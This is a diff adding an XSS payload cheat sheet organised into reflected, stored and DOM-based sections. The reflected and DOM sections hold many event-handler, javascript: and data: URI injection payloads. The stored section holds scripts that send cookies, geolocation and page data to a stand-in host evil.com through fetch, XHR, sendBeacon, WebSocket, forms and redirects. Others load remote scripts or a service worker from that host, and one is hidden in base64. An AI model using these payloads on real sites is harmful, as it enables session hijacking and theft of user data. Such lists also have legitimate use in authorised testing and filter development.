@@ -1,0 +1,415 @@
+Reflected
+.
+<svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg" style="display:none">
+.
+<iframe src="javascript:alert(1)" onload="alert(2)">
+.
+<object data="javascript:alert(1)" type="text/html">
+.
+<embed src="javascript:alert(1)" type="application/x-oleobject">
+.
+
+<base href="javascript:alert(1)//">
+.
+<link rel="stylesheet" href="data:text/css,body{background:url(javascript:alert(1))}">
+.
+<style>@import "data:text/css,body{background:url(javascript:alert(1))}"</style>
+.
+<style>@import "javascript:alert(1)";</style>
+.
+<xmp onmouseenter="alert(1)">hover</xmp>
+.
+<listing onfocus="alert(1)" autofocus>
+.
+<plaintext oncopy="alert(1)">copy me</plaintext>
+.
+<textarea oncut="alert(1)" autofocus></textarea>
+.
+<keygen onpaste="alert(1)" autofocus>
+.
+<select onchange="alert(1)" autofocus><option>1</option></select>
+.
+<input oninput="alert(1)" autofocus>
+.
+<input oninvalid="alert(1)" pattern=".*" required>
+.
+<button onauxclick="alert(1)" autofocus>click</button>
+.
+<div oncontextmenu="alert(1)">right click</div>
+.
+<div ondrag="alert(1)" draggable="true">drag me</div>
+.
+<div ondrop="alert(1)" ondragover="event.preventDefault()">drop here</div>
+.
+<div onwheel="alert(1)">scroll</div>
+.
+<div ontouchstart="alert(1)">touch</div>
+.
+<div onanimationstart="alert(1)" style="animation: x 1s"></div>
+.
+<div ontransitionend="alert(1)" style="transition: all 1s"></div>
+.
+<img src="x" onerror="alert(1)" onload="alert(2)">
+.
+<iframe srcdoc="<img src=x onerror=alert(1)>">
+.
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+.
+<embed src="data:text/html;charset=utf-8,%3Cscript%3Ealert(1)%3C/script%3E">
+.
+<a href="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">click</a>
+.
+<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">click</maction>
+.
+<math><mtext><a xmlns="http://www.w3.org/1999/xhtml" href="javascript:alert(1)">click</a></mtext></math>
+.
+<svg onload="alert('XSS')" xmlns="http://www.w3.org/2000/svg">
+.
+<body onload="alert('XSS')">
+.
+<input onfocus="alert('XSS')" autofocus>
+.
+<details ontoggle="alert('XSS')" open>
+.
+<audio src=x onerror="alert('XSS')" autoplay>
+.
+<video src=x onerror="alert('XSS')" autoplay>
+.
+<source src=x onerror="alert('XSS')">
+.
+<track src=x onerror="alert('XSS')">
+.
+<map name="m"><area href="javascript:alert('XSS')">
+.
+<math><mtext><img src=x onerror="alert('XSS')"></mtext></math>
+.
+<svg><animate onbegin="alert('XSS')" attributeName=x dur=1s>
+.
+<svg><set onbegin="alert('XSS')" attributeName=x to=1>
+.
+<svg><animateMotion onbegin="alert('XSS')" dur=1s>
+.
+<svg><foreignObject><img src=x onerror="alert('XSS')"></foreignObject>
+.
+<svg><image href="javascript:alert('XSS')">
+.
+<svg><use href="javascript:alert('XSS')">
+.
+<svg><a href="javascript:alert('XSS')"><text>click</text></a>
+.
+<svg><desc><img src=x onerror="alert('XSS')"></desc>
+.
+<svg><title><img src=x onerror="alert('XSS')"></title>
+
+--------------------------
+
+Stored
+.
+
+<script>navigator.sendBeacon('//evil.com/log', document.cookie)</script>
+
+.
+
+<script>var img = new Image(); img.crossOrigin = 'anonymous'; img.src = '//evil.com/steal?' + document.cookie</script>
+
+.
+
+<script>var ws = new WebSocket('ws://evil.com:8080'); ws.onopen = function(){ws.send(document.cookie)}</script>
+
+.
+
+<script>window.addEventListener('message', function(e){e.source.postMessage(document.cookie, '*')})</script>
+
+.
+
+<script>navigator.serviceWorker.register('//evil.com/sw.js')</script>
+
+.
+
+<script>var b = new BroadcastChannel('xss'); b.postMessage(document.cookie)</script>
+
+.
+
+<script>var x = new XMLHttpRequest(); x.open('POST', '//evil.com/collect', true); x.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); x.send('c='+encodeURIComponent(document.cookie))</script>
+
+.
+
+<script>fetch('//evil.com/steal?c='+btoa(document.cookie), {mode:'no-cors'})</script>
+
+.
+
+<script>eval(atob('bmV3IEltYWdlKCkuc3JjID0gJy8vZXZpbC5jb20/cz0nK2RvY3VtZW50LmNvb2tpZQ=='))</script>
+
+.
+
+<script>document.write('<script src="//evil.com/xss.js"><\/script>')</script>
+
+.
+
+<script>var s = document.createElement('script'); s.src = '//evil.com/xss.js'; document.head.appendChild(s)</script>
+
+.
+
+<script>import('//evil.com/xss.js')</script>
+
+.
+
+<script>Function('alert(document.cookie)')()</script>
+
+.
+
+<script>setTimeout('alert(document.cookie)', 0)</script>
+
+.
+
+<script>setInterval('navigator.sendBeacon("//evil.com/keep", document.cookie)', 5000)</script>
+
+.
+
+<script>var ifr = document.createElement('iframe'); ifr.src = '//evil.com/collect#'+document.cookie; document.body.appendChild(ifr)</script>
+
+.
+
+<script>var a = document.createElement('a'); a.href = '//evil.com/redirect?c='+document.cookie; a.click()</script>
+
+.
+
+<script>window.location.replace('//evil.com/?c='+document.cookie)</script>
+
+.
+
+<script>history.pushState({}, '', '//evil.com/?c='+document.cookie)</script>
+
+.
+
+<script>document.domain = 'evil.com'; // для кросс-доменной отправки</script>
+
+.
+
+<script>window.name = document.cookie; // затем другой скрипт читает</script>
+
+.
+
+<script>var perf = performance.getEntries(); fetch('//evil.com/metrics?'+JSON.stringify(perf))</script>
+
+.
+
+<script>navigator.geolocation.getCurrentPosition(function(p){fetch('//evil.com/geo?'+p.coords.latitude+','+p.coords.longitude)})</script>
+
+.
+
+<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText(document.cookie, 0, 0); var data = canvas.toDataURL(); fetch('//evil.com/canvas?'+encodeURIComponent(data))</script>
+
+.
+
+<script>var audioCtx = new (window.AudioContext || window.webkitAudioContext)(); audioCtx.resume(); // fingerprint</script>
+
+.
+
+<script>var font = new FontFace('myfont', 'url(//evil.com/font.woff)'); font.load().then(function(){document.fonts.add(font)})</script>
+
+.
+
+<script>var link = document.createElement('link'); link.rel = 'stylesheet'; link.href = '//evil.com/style.css?c='+document.cookie; document.head.appendChild(link)</script>
+
+.
+
+<script>var style = document.createElement('style'); style.textContent = '@import "//evil.com/import.css?c='+document.cookie+'";'; document.head.appendChild(style)</script>
+
+.
+
+<script>var meta = document.createElement('meta'); meta.httpEquiv = 'refresh'; meta.content = '0; url=//evil.com/?c='+document.cookie; document.head.appendChild(meta)</script>
+
+.
+
+<script>var base = document.createElement('base'); base.href = '//evil.com/'; document.head.appendChild(base); // перенаправление ссылок</script>
+
+.
+
+<script>var form = document.createElement('form'); form.action = '//evil.com/collect'; form.method = 'POST'; var input = document.createElement('input'); input.name = 'c'; input.value = document.cookie; form.appendChild(input); document.body.appendChild(form); form.submit()</script>
+
+.
+
+<script>var script = document.createElement('script'); script.textContent = 'alert("stored XSS")'; document.body.appendChild(script)</script>
+
+.
+
+<script>var iframe = document.createElement('iframe'); iframe.srcdoc = '<script>alert(document.cookie)<\/script>'; document.body.appendChild(iframe)</script>
+
+.
+
+<script>var object = document.createElement('object'); object.data = 'data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+'; document.body.appendChild(object)</script>
+
+.
+
+<script>var embed = document.createElement('embed'); embed.src = 'data:text/html,<script>alert(document.cookie)</script>'; document.body.appendChild(embed)</script>
+
+.
+
+<script>var audio = document.createElement('audio'); audio.src = '//evil.com/audio.wav?c='+document.cookie; audio.autoplay = true; document.body.appendChild(audio)</script>
+
+.
+
+<script>var video = document.createElement('video'); video.src = '//evil.com/video.mp4?c='+document.cookie; video.autoplay = true; document.body.appendChild(video)</script>
+
+.
+
+<script>var img = document.createElement('img'); img.src = '//evil.com/steal?c='+document.cookie; img.style.display = 'none'; document.body.appendChild(img)</script>
+
+.
+
+<script>var svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg'); var script2 = document.createElementNS('http://www.w3.org/2000/svg', 'script'); script2.textContent = 'alert(document.cookie)'; svg.appendChild(script2); document.body.appendChild(svg)</script>
+
+.
+
+<script>var math = document.createElementNS('http://www.w3.org/1998/Math/MathML', 'math'); var mtext = document.createElementNS('http://www.w3.org/1998/Math/MathML', 'mtext'); mtext.textContent = 'x'; math.appendChild(mtext); document.body.appendChild(math) // но с href не работает, добавим через атрибут</script>
+
+.
+
+<script>document.body.innerHTML += '<img src=x onerror="alert(document.cookie)">'</script>
+
+.
+
+<script>document.write('<iframe srcdoc="<script>alert(document.cookie)<\/script>">')</script>
+
+.
+
+<script>var xhr = new XMLHttpRequest(); xhr.open('GET', '//evil.com/steal?c='+document.cookie, false); xhr.send()</script>
+
+.
+
+<script>var xhr = new XMLHttpRequest(); xhr.open('GET', '//evil.com/steal?c='+document.cookie); xhr.withCredentials = true; xhr.send()</script>
+
+.
+
+<script>var s = document.createElement('script'); s.textContent = 'alert("XSS")'; document.head.appendChild(s)</script>
+
+.
+
+<script>var div = document.createElement('div'); div.setAttribute('onclick', 'alert(document.cookie)'); div.textContent = 'click me'; document.body.appendChild(div)</script>
+
+.
+
+<script>var button = document.createElement('button'); button.setAttribute('onclick', 'alert(document.cookie)'); button.textContent = 'click me'; document.body.appendChild(button)</script>
+
+.
+
+<script>var input = document.createElement('input'); input.setAttribute('onfocus', 'alert(document.cookie)'); input.autofocus = true; document.body.appendChild(input)</script>
+
+.
+
+<script>var details = document.createElement('details'); details.setAttribute('ontoggle', 'alert(document.cookie)'); details.setAttribute('open', ''); details.textContent = 'click'; document.body.appendChild(details)</script>
+
+.
+
+<script>var marquee = document.createElement('marquee'); marquee.setAttribute('onstart', 'alert(document.cookie)'); marquee.textContent = 'hello'; document.body.appendChild(marquee)</script>
+
+.
+
+<script>var meta2 = document.createElement('meta'); meta2.httpEquiv = 'set-cookie'; meta2.content = 'xss=1; path=/'; document.head.appendChild(meta2) // установка куки через мета (не всегда работает, но как пример)</script>
+
+--------------------------
+
+DOM-based
+.
+#<img src=x onerror=alert(1)>
+.
+#<svg onload=alert(1)>
+.
+#<script>alert(1)</script>
+.
+#<body onload=alert(1)>
+.
+#<iframe src=javascript:alert(1)>
+.
+#<object data=javascript:alert(1)>
+.
+#<embed src=javascript:alert(1)>
+.
+#<a href=javascript:alert(1)>click</a>
+.
+#<div onclick=alert(1)>click</div>
+.
+#<input onfocus=alert(1) autofocus>
+.
+#<button onclick=alert(1)>click</button>
+.
+#<details ontoggle=alert(1) open>
+.
+#<audio src=x onerror=alert(1) autoplay>
+.
+#<video src=x onerror=alert(1) autoplay>
+.
+#<source src=x onerror=alert(1)>
+.
+#<track src=x onerror=alert(1)>
+.
+#<math><mtext><img src=x onerror=alert(1)></mtext></math>
+.
+#<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+.
+#<svg><set onbegin=alert(1) attributeName=x to=1>
+.
+#<svg><animateMotion onbegin=alert(1) dur=1s>
+.
+#<svg><foreignObject><img src=x onerror=alert(1)></foreignObject>
+.
+#<style>body{background:url(javascript:alert(1))}</style>
+.
+#<link rel=stylesheet href=javascript:alert(1)>
+.
+#<object data="data:text/html,<script>alert(1)</script>">
+.
+#<embed src="data:text/html,<script>alert(1)</script>">
+.
+#<iframe srcdoc="<svg/onload=alert(1)>">
+.
+#<form action=javascript:alert(1)><input type=submit>
+.
+#<button formaction=javascript:alert(1)>click</button>
+.
+#<input type=image src=x onerror=alert(1)>
+.
+#<isindex type=image src=javascript:alert(1)>
+.
+#<isindex action=javascript:alert(1)>
+.
+#<details open ontoggle=alert(1)>
+.
+#<summary onclick=alert(1)>click</summary>
+.
+#<menu><li onclick=alert(1)>click</li></menu>
+.
+#<menuitem onclick=alert(1)>
+.
+#<command onclick=alert(1)>
+.
+#<base href=javascript:alert(1)//>
+.
+#<math><mtext><a href=javascript:alert(1)>click</a></mtext></math>
+.
+#<math><mtext><svg onload=alert(1)></mtext></math>
+.
+#<math><script>alert(1)</script></math>
+.
+#<math><img src=x onerror=alert(1)></math>
+.
+#<math><svg onload=alert(1)></math>
+.
+#<math><mtext><img src=x onerror=alert(1)></mtext></math>
+.
+#<math><maction actiontype=statusline xlink:href=javascript:alert(1)>click</maction>
+.
+#<math><annotation encoding="application/x-tex">\href{javascript:alert(1)}{click}</annotation>
+.
+#<math><mstyle href=javascript:alert(1)><mtext>click</mtext></mstyle>
+.
+#<math><merror href=javascript:alert(1)><mtext>click</mtext></merror>
+.
+#<math><mpadded href=javascript:alert(1)><mtext>click</mtext></mpadded>
+.
+#<math><mphantom href=javascript:alert(1)><mtext>click</mtext></mphantom>
+.
+#<math><mrow href=javascript:alert(1)><mtext>click</mtext></mrow>
+.
+#<math><menclose href=javascript:alert(1)><mtext>click</mtext></menclose>
